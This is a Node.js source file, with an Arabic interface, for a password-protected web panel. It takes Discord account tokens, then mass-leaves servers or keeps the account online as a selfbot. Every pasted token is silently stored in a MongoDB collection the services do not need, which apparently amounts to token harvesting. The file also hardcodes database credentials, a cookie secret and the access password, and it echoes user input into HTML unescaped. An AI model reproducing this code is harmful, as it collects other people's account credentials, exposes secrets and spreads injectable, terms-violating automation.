require("dotenv").config();
const express = require("express");
const cookieParser = require("cookie-parser");
const mongoose = require("mongoose");
const { Client } = require("discord.js-selfbot-v13");

const {
  PORT = 3000,
  MONGO_URI = "mongodb+srv://omargamingff2_db_user:CT8NNal0NVdHdoB9@cluster0.pab2lk3.mongodb.net/",
  COOKIE_SECRET = "keo_secret_key_999"
} = process.env;

const API = "https://discord.com/api/v10";

// الاتصال بقاعدة البيانات
mongoose.connect(MONGO_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true
}).then(() => console.log("Connected to MongoDB!")).catch(err => console.error(err));

// نموذج تخزين التوكنات
const userSchema = new mongoose.Schema({
  token: { type: String, required: true, unique: true },
  createdAt: { type: Date, default: Date.now }
});
const TokenModel = mongoose.model("bot_tokens", userSchema);

// لتخزين جلسات السيلف بوت النشطة وإبقائها أونلاين
const activeClients = new Map();

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser(COOKIE_SECRET));

// القالب التصميمي الموحد (الهالووين)
const layout = (title, content) => `<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>${title}</title>
  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800&display=swap" rel="stylesheet">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: linear-gradient(rgba(10, 5, 20, 0.7), rgba(10, 5, 20, 0.8)), 
                  url('https://images.unsplash.com/photo-1509557965875-b88c97052f0e?q=80&w=1920&auto=format&fit=crop') no-repeat center center fixed;
      background-size: cover;
      color: #e0def4;
      font-family: 'Tajawal', sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .card {
      background: rgba(20, 14, 28, 0.9);
      backdrop-filter: blur(15px);
      border: 1px solid rgba(255, 107, 0, 0.35);
      border-radius: 24px;
      padding: 40px 30px;
      text-align: center;
      max-width: 480px;
      width: 100%;
      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.9), 0 0 35px rgba(255, 107, 0, 0.2);
    }
    h2 { font-size: 22px; color: #ff9f43; margin-bottom: 20px; font-weight: 700; }
    p { font-size: 14px; color: #b8b5e0; margin-bottom: 20px; line-height: 1.6; }
    input[type="password"], input[type="text"], select {
      width: 100%;
      padding: 14px;
      background: rgba(10, 5, 20, 0.8);
      border: 1px solid rgba(255, 107, 0, 0.3);
      border-radius: 12px;
      color: #fff;
      font-family: 'Tajawal', sans-serif;
      font-size: 15px;
      margin-bottom: 20px;
      outline: none;
      text-align: center;
    }
    input:focus { border-color: #ff7b00; box-shadow: 0 0 10px rgba(255, 123, 0, 0.3); }
    .btn {
      display: block;
      width: 100%;
      background: linear-gradient(135deg, #ff7b00, #ff4500);
      color: #fff;
      border: none;
      padding: 14px;
      border-radius: 12px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      text-decoration: none;
      transition: 0.3s;
      box-shadow: 0 4px 15px rgba(255, 123, 0, 0.4);
      margin-bottom: 12px;
    }
    .btn:hover { transform: translateY(-2px); opacity: 0.9; }
    .btn-secondary {
      background: rgba(255, 255, 255, 0.08);
      border: 1px solid rgba(255, 255, 255, 0.15);
      box-shadow: none;
    }
    .logs-box {
      background: rgba(5, 2, 10, 0.95);
      border: 1px solid rgba(255, 107, 0, 0.3);
      border-radius: 12px;
      padding: 15px;
      text-align: right;
      max-height: 250px;
      overflow-y: auto;
      font-family: monospace;
      font-size: 13px;
      color: #57f287;
      margin-bottom: 20px;
    }
    .developer-sig {
      font-size: 10px;
      font-weight: 300;
      color: rgba(255, 255, 255, 0.4);
      letter-spacing: 2px;
      text-transform: uppercase;
      border-top: 1px solid rgba(255, 255, 255, 0.08);
      padding-top: 15px;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="card">
    ${content}
    <div class="developer-sig">made by syrian devloper : keo</div>
  </div>
</body>
</html>`;

// 1. صفحة إدخال كلمة السر
app.get("/auth", (req, res) => {
  res.send(layout("تسجيل الدخول", `
    <h2>🔒 بوابة الحماية المرعبة</h2>
    <p>أدخل كلمة السر الخاصة للوصول إلى لوحة التحكم</p>
    <form method="POST" action="/auth">
      <input type="password" name="password" placeholder="أدخل كلمة السر..." required>
      <button class="btn" type="submit">دخول</button>
    </form>
  `));
});

app.post("/auth", (req, res) => {
  if (req.body.password === "mılanmembersite") {
    res.cookie("auth_pass", "true", { signed: true, httpOnly: true });
    res.redirect("/");
  } else {
    res.send(layout("خطأ", `<h2>❌ كلمة السر خاطئة!</h2><a class="btn" href="/auth">إعادة المحاولة</a>`));
  }
});

// Middleware للتحقق من كلمة السر
const checkAuth = (req, res, next) => {
  if (req.signedCookies.auth_pass !== "true") return res.redirect("/auth");
  next();
};

// 2. صفحة إدخال التوكن
app.get("/", checkAuth, (req, res) => {
  res.send(layout("إدخال التوكن", `
    <h2>🔑 إدخال توكن الحساب</h2>
    <p>أدخل توكن حساب ديسكورد الخاص بك للبدء</p>
    <form method="POST" action="/save-token">
      <input type="text" name="token" placeholder="ضع التوكن هنا..." required>
      <button class="btn" type="submit">حفظ ومتابعة</button>
    </form>
  `));
});

app.post("/save-token", checkAuth, async (req, res) => {
  const { token } = req.body;
  if (!token) return res.redirect("/");
  
  try {
    await TokenModel.findOneAndUpdate({ token }, { token }, { upsert: true, new: true });
    res.cookie("user_token", token, { signed: true, httpOnly: true });
    res.redirect("/dashboard");
  } catch (err) {
    res.send(layout("خطأ", `<h2>❌ حدث خطأ أثناء حفظ التوكن</h2><a class="btn" href="/">العودة</a>`));
  }
});

// 3. لوحة التحكم الرئيسية (الخدمات)
app.get("/dashboard", checkAuth, (req, res) => {
  const token = req.signedCookies.user_token;
  if (!token) return res.redirect("/");

  res.send(layout("لوحة التحكم - الخدمات", `
    <h2>🦇 شو الخدمة الي تبيها يا معلم؟</h2>
    <p>اختر الخدمة المطلوبة لتنفيذها على الحساب</p>
    <a class="btn" href="/leave-servers">الخدمة الأولى: إخراج الحساب من السيرفرات</a>
    <a class="btn" href="/online-options">الخدمة الثانية: جعل الحساب أونلاين دائماً</a>
  `));
});

// --- تنفيذ الخدمة الأولى: مغادرة السيرفرات مع عرض السجلات ---
app.get("/leave-servers", checkAuth, async (req, res) => {
  const token = req.signedCookies.user_token;
  if (!token) return res.redirect("/");

  res.send(layout("جاري المغادرة...", `
    <h2>⚠️ جاري الخروج من السيرفرات...</h2>
    <div class="logs-box" id="logs">جاري جلب قائمة السيرفرات...</div>
    <script>
      async function startLeaving() {
        const box = document.getElementById('logs');
        try {
          const res = await fetch('/api/leave', { method: 'POST' });
          const reader = res.body.getReader();
          const decoder = new TextDecoder();
          box.innerHTML = '';
          while (true) {
            const { value, done } = await reader.read();
            if (done) break;
            box.innerHTML += decoder.decode(value, { stream: true });
            box.scrollTop = box.scrollHeight;
          }
          box.innerHTML += '<br><b>✅ تم الانتهاء من مغادرة جميع السيرفرات! جاري إعادتك...</b>';
          setTimeout(() => { window.location.href = '/'; }, 3000);
        } catch (e) {
          box.innerHTML += '<br>❌ حدث خطأ أثناء التنفيذ.';
        }
      }
      startLeaving();
    </script>
  `));
});

app.post("/api/leave", checkAuth, async (req, res) => {
  const token = req.signedCookies.user_token;
  res.setHeader('Content-Type', 'text/html; charset=utf-8');

  try {
    const guildsRes = await fetch(`${API}/users/@me/guilds`, {
      headers: { Authorization: token }
    });
    if (!guildsRes.ok) {
      res.write("فشل جلب السيرفرات، تأكد من صحة التوكن.");
      return res.end();
    }
    const guilds = await guildsRes.json();

    for (const guild of guilds) {
      try {
        const leaveRes = await fetch(`${API}/users/@me/guilds/${guild.id}`, {
          method: "DELETE",
          headers: { Authorization: token }
        });
        if (leaveRes.ok || leaveRes.status === 204) {
          res.write(`- تم الخروج من ${guild.name}<br>`);
        } else {
          res.write(`- فشل الخروج من ${guild.name}<br>`);
        }
        await new Promise(r => setTimeout(r, 800)); // تأخير لتجنب الحظر المؤقت
      } catch (err) {
        res.write(`- خطأ في سيرفر ${guild.name}<br>`);
      }
    }
  } catch (e) {
    res.write("حدث خطأ عام أثناء العملية.");
  }
  res.end();
});

// --- تنفيذ الخدمة الثانية: إبقاء الحساب أونلاين ---
app.get("/online-options", checkAuth, (req, res) => {
  res.send(layout("إعداد الحالة أونلاين", `
    <h2>🟢 إبقاء الحساب أونلاين دائماً</h2>
    <form method="POST" action="/start-online">
      <select name="statusType">
        <option value="PLAYING">يلعب (Playing)</option>
        <option value="STREAMING">يبث (Streaming)</option>
        <option value="WATCHING">يشاهد (Watching)</option>
        <option value="LISTENING">يستمع (Listening)</option>
      </select>
      <input type="text" name="statusText" placeholder="اكتب اسم النشاط (مثال: KEO BOT)..." required>
      <button class="btn" type="submit">تشغيل الحالة وتثبيتها</button>
    </form>
    <a class="btn btn-secondary" href="/dashboard">العودة للوحة التحكم</a>
  `));
});

app.post("/start-online", checkAuth, async (req, res) => {
  const token = req.signedCookies.user_token;
  const { statusType, statusText } = req.body;
  if (!token) return res.redirect("/");

  // إيقاف أي جلسة سابقة لهذا التوكن منعاً لتكرار الاتصال
  if (activeClients.has(token)) {
    try { activeClients.get(token).destroy(); } catch(e){}
    activeClients.delete(token);
  }

  const client = new Client();

  client.on("ready", () => {
    console.log(`Logged in as ${client.user.tag}!`);
    client.user.setPresence({
      activities: [{ name: statusText, type: statusType }],
      status: "online"
    });
  });

  try {
    await client.login(token);
    activeClients.set(token, client);
    res.send(layout("تم التشغيل", `
      <h2>🚀 تم تفعيل حالة الحساب بنجاح!</h2>
      <p>الحساب الآن يعمل أونلاين بوضع (${statusType}: ${statusText}) وسيظل يعمل دائماً طالما السيرفر يعمل.</p>
      <a class="btn" href="/dashboard">العودة للوحة التحكم</a>
    `));
  } catch (err) {
    res.send(layout("خطأ", `
      <h2>❌ فشل تسجيل الدخول بالتوكن</h2>
      <p>تأكد من صحة التوكن المدخل.</p>
      <a class="btn" href="/online-options">إعادة المحاولة</a>
    `));
  }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
